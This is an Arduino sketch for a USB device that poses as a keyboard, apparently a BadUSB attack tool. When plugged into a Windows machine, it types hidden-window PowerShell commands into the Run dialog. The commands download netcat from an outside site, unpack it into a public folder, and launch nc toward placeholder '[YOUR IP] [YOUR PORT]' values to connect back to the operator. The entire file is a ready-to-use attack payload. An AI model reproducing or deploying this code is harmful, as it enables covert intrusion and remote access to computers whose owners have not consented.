#include <Keyboard.h>

void setup() { 
      Keyboard.begin();
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      delay(2500);
      Keyboard.releaseAll();
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      delay(2500);
      Keyboard.releaseAll();
      Keyboard.print("PowerShell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip','C:/Users/Public/Downloads/netcat-win32-1.11.zip');");
      Keyboard.press(KEY_RETURN);
      delay(2500);
      Keyboard.releaseAll();
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      delay(2500);
      Keyboard.releaseAll();
      Keyboard.print("PowerShell.exe -windowstyle hidden mkdir C:/Users/Public/Documents/netcat-1.11;Expand-Archive C:/Users/Public/Downloads/netcat-win32-1.11.zip -DestinationPath C:/Users/Public/Documents/netcat-1.11;"); 
      delay(2500);
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      delay(2500);
      Keyboard.releaseAll();
      Keyboard.print("PowerShell.exe -windowstyle hidden cd C:/Users/Public/Documents/netcat-1.11/netcat-1.11;nc [YOUR IP] [YOUR PORT];");
      Keyboard.press(KEY_RETURN);
      delay(2500);  
      Keyboard.releaseAll();   
      delay(100);
      Keyboard.releaseAll();
      Keyboard.releaseAll();
      Keyboard.end();
}

void loop() {
 
}    
